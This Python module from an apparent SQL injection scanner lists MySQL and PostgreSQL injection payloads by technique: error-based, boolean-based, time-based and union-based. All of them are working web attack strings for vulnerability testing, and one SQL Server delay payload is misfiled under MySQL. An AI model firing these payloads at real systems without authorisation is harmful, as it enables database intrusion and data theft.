"""
NOA SQL Scanner - SQL Injection Payloads
MySQL & PostgreSQL focused payloads
"""

# Error-Based Payloads
ERROR_BASED_PAYLOADS = {
    'mysql': [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\" --",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "')) OR (('1'='1",
        "' OR 'x'='x",
        "') OR 'x'='x",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION SELECT NULL, version()--",
        "' AND 1=0 UNION SELECT NULL, database()--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
    ],
    'postgresql': [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1--",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "' OR 'x'='x",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION SELECT NULL, version()--",
        "' AND 1=0 UNION SELECT NULL, current_database()--",
        "'; SELECT version()--",
        "' OR 1=1; SELECT version()--",
        "' OR 1::int=1--",
        "' AND 1=CAST('1' AS INTEGER)--",
    ]
}

# Boolean-Based Payloads
BOOLEAN_BASED_PAYLOADS = {
    'mysql': [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("') AND ('1'='1", "') AND ('1'='2"),
        (" AND 1=1", " AND 1=2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
    ],
    'postgresql': [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("') AND ('1'='1", "') AND ('1'='2"),
        (" AND 1=1", " AND 1=2"),
        ("' AND TRUE--", "' AND FALSE--"),
    ]
}

# Time-Based Payloads
TIME_BASED_PAYLOADS = {
    'mysql': [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('A'))--",
        "') AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "\" AND SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "'; WAITFOR DELAY '00:00:05'--",
    ],
    'postgresql': [
        "'; SELECT pg_sleep(5)--",
        "' AND pg_sleep(5)--",
        "') AND pg_sleep(5)--",
        "' OR pg_sleep(5)--",
        "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    ]
}

# Union-Based Payloads
UNION_BASED_PAYLOADS = {
    'mysql': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' GROUP BY 1--",
        "' GROUP BY 2--",
    ],
    'postgresql': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL::text--",
        "' UNION SELECT NULL::text,NULL::text--",
        "' UNION ALL SELECT NULL--",
        "' ORDER BY 1--",
        "' ORDER BY 2--",
    ]
}

def get_all_payloads(db_type='both'):
    """
    Get all payloads for specified database type
    
    Args:
        db_type: 'mysql', 'postgresql', or 'both'
    
    Returns:
        Dictionary of categorized payloads
    """
    if db_type == 'mysql':
        return {
            'error': ERROR_BASED_PAYLOADS['mysql'],
            'boolean': BOOLEAN_BASED_PAYLOADS['mysql'],
            'time': TIME_BASED_PAYLOADS['mysql'],
            'union': UNION_BASED_PAYLOADS['mysql']
        }
    elif db_type == 'postgresql':
        return {
            'error': ERROR_BASED_PAYLOADS['postgresql'],
            'boolean': BOOLEAN_BASED_PAYLOADS['postgresql'],
            'time': TIME_BASED_PAYLOADS['postgresql'],
            'union': UNION_BASED_PAYLOADS['postgresql']
        }
    else:  # both
        return {
            'error': ERROR_BASED_PAYLOADS['mysql'] + ERROR_BASED_PAYLOADS['postgresql'],
            'boolean': BOOLEAN_BASED_PAYLOADS['mysql'] + BOOLEAN_BASED_PAYLOADS['postgresql'],
            'time': TIME_BASED_PAYLOADS['mysql'] + TIME_BASED_PAYLOADS['postgresql'],
            'union': UNION_BASED_PAYLOADS['mysql'] + UNION_BASED_PAYLOADS['postgresql']
        }
